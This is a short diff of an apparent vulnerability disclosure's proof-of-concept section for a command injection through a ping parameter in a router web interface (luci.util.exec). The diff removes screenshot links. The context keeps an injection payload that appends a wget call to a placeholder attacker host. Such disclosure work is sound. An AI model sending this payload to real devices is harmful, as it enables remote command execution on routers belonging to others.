@@ -27,10 +27,5 @@ Proof of Concept (PoC)
 127.0.0.1; wget http://ATTACKER_IP:7777/poc
 ```
 
-<img width="1098" height="301" alt="2026-04-08 00_32_00-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/45531167-66ac-4e06-9d51-1c5d6eae30e3" />
 
-
-<img width="1080" height="126" alt="2026-04-08 00_34_17-havook e mais uma guia - Explorador de Arquivos" src="https://github.com/user-attachments/assets/4048048c-3775-4c49-a1b1-dff66a3929a4" />
-
-<img width="935" height="705" alt="2026-04-09 09_24_46-Configurações" src="https://github.com/user-attachments/assets/399abfd3-c3f9-48d8-880b-815d09897be8" />
 Command execution is performed via luci.util.exec using user-controlled input from the ping parameter.
